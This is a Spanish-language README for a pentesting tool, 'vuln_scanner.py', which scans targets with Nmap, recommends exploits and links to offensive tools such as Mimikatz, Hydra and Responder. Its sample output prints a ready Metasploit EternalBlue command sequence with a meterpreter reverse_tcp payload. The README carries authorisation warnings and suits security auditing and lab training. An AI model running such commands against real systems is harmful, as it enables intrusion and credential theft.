# 🛡️ Vulnerability Scanner & Exploitation Framework

Herramienta de escaneo de vulnerabilidades y framework de explotación para auditorías de seguridad.

> ⚠️ **ADVERTENCIA**: Esta herramienta es exclusivamente para fines educativos y auditorías de seguridad en sistemas donde tengas autorización explícita. El uso no autorizado es ilegal.

---

## 📌 Descripción

`vuln_scanner.py` es un framework de ciberseguridad que combina:

1. **Escaneo de vulnerabilidades** - Utiliza Nmap con scripts de vuln para detectar servicios vulnerables
2. **Base de datos de exploits** - 25+ vulnerabilidades conocidas con recomendaciones de explotación automáticas
3. **Menú de herramientas de intrusión** - 25 herramientas de pentesting en un solo lugar
4. **Reportes detallados** - Genera informes por severidad (CRITICAL, HIGH, MEDIUM, LOW)

### Características Principales

- ✅ Detección automática de vulnerabilidades por CVE
- ✅ Match inteligente con base de datos de exploits
- ✅ Recomendaciones de explotación para cada vulnerabilidad
- ✅ Comandos listos para copiar y ejecutar
- ✅ Soporte para Metasploit, SQLMap, WPScan, y más
- ✅ Reportes en formato texto guardables

---

## 🚀 Instalación

### Requisitos

- Python 3.8+
- Nmap instalado
- Sistema Linux (Kali/Parrot recomendado)

### Pasos

```bash
# 1. Clonar el repositorio
git clone https://github.com/TU_USUARIO/vuln-scanner.git
cd vuln-scanner

# 2. Instalar dependencias
sudo apt update
sudo apt install -y nmap metasploit-framework wpscan sqlmap nikto \
    gobuster ffuf hydra exploitdb john hashcat

# 3. Ejecutar
sudo python3 vuln_scanner.py
```

---

## 📖 Uso

### Ejecución básica

```bash
sudo python3 vuln_scanner.py
```

### Menú Principal

```
======================================================================
  MENÚ PRINCIPAL - VULNERABILITY SCANNER & EXPLOITATION
======================================================================

  [1] Escanear vulnerabilidades + Exploits recomendados
  [2] Herramientas de Intrusión
  [3] Explotar vulnerabilidad detectada
  [4] Salir

  ADVERTENCIA: Solo use en sistemas autorizados
```

### Opción 1: Escanear Vulnerabilidades

1. Ingresa la IP o hostname del objetivo
2. Especifica puertos (opcional, Enter para escaneo completo)
3. Especifica directorio de salida para el reporte (opcional)
4. El escaneo detectará vulnerabilidades y recomendará exploits

**Ejemplo de salida:**
```
[CRITICAL] EternalBlue detectado
    Host: 192.168.1.100
    Puerto: 445/tcp
    Servicio: Microsoft Windows SMB

    ► EXPLOIT RECOMENDADO: EternalBlue
    Herramienta: METASPLOT
    Módulo: exploit/windows/smb/ms17_010_eternalblue
    Descripción: Ejecuta código remoto como SYSTEM

    COMANDO/EJEMPLO:
    ────────────────────────────────────────────────────
    use exploit/windows/smb/ms17_010_eternalblue
    set RHOSTS 192.168.1.100
    set PAYLOAD windows/x64/meterpreter/reverse_tcp
    set LHOST <tu_ip>
    exploit
```

### Opción 2: Herramientas de Intrusión

Acceso rápido a 25 herramientas de pentesting:

| Herramienta | Descripción |
|-------------|-------------|
| Metasploit | Framework de explotación |
| WPScan | Escaneo de WordPress |
| SQLMap | Inyección SQL automática |
| Nikto | Web vulnerability scanner |
| Gobuster | Directory bruteforcing |
| FFUF | Web fuzzing rápido |
| Burp Suite | Proxy de interceptación |
| Aircrack-ng | Auditoría de redes WiFi |
| John the Ripper | Password cracking |
| Hashcat | GPU password cracking |
| Hydra | Brute force multi-servicio |
| SearchSploit | Base de datos de exploits |
| Netcat | Herramienta de red |
| Wireshark | Análisis de paquetes |
| Dirb | Directory scanner |
| Commix | Command injection |
| XSStrike | XSS detector |
| WhatWeb | Web technology scanner |
| TestSSL.sh | SSL/TLS security tester |
| Nuclei | Vulnerability scanner |
| Impacket | Herramientas SMB/Windows |
| Responder | LLMNR/NBT-NS poisoning |
| Mimikatz | Credential dumping |
| LinPEAS | Linux privilege escalation |

### Opción 3: Explotar Vulnerabilidad

1. Escanea el objetivo primero
2. Selecciona una vulnerabilidad de la lista
3. Elige entre generar script .rc o ejecutar automáticamente
4. Configura LHOST si es necesario

---

## 📁 Estructura del Proyecto

```
vuln-scanner/
├── vuln_scanner.py      # Script principal
├── README.md            # Este archivo
├── LICENSE              # Licencia MIT
└── reports/             # Reportes generados (auto-creado)
```

---

## 🎯 Ejemplos Prácticos

### Escanear una máquina Metasploitable

```bash
sudo python3 vuln_scanner.py
# Opción 1
# Objetivo: 192.168.1.100
# Puertos: Enter (todos)
# Directorio: ./reports
```

### Usar herramienta específica directamente

```bash
# WPScan desde el menú
python3 vuln_scanner.py
# Opción 2 → 2 (WPScan)
# URL: http://192.168.1.100
```

---

## ⚖️ Consideraciones Legales

**USO AUTORIZADO:**
- ✅ Auditorías de seguridad con permiso por escrito
- ✅ Entornos de laboratorio propios
- ✅ Máquinas de práctica (Metasploitable, DVWA, HackTheBox, TryHackMe)
- ✅ Fines educativos y de investigación

**NO USAR PARA:**
- ❌ Acceder a sistemas sin autorización
- ❌ Actividades ilegales
- ❌ Dañar sistemas de terceros

---

## 📚 Recursos Útiles

| Recurso | Enlace |
|---------|--------|
| HackTheBox | https://www.hackthebox.com |
| TryHackMe | https://tryhackme.com |
| OWASP Top 10 | https://owasp.org/www-project-top-ten/ |
| CVE Database | https://cve.mitre.org |
| ExploitDB | https://www.exploit-db.com |

---

## 🤝 Contribuir

1. Fork el proyecto
2. Crea una rama (`git checkout -b feature/mejora`)
3. Commit (`git commit -m 'Añade mejora'`)
4. Push (`git push origin feature/mejora`)
5. Pull Request

---

## 📄 Licencia

MIT License

---

<div align="center">

**🔐 Uso responsable y ético 🔐**

*"Con grandes poderes vienen grandes responsabilidades"*

</div>
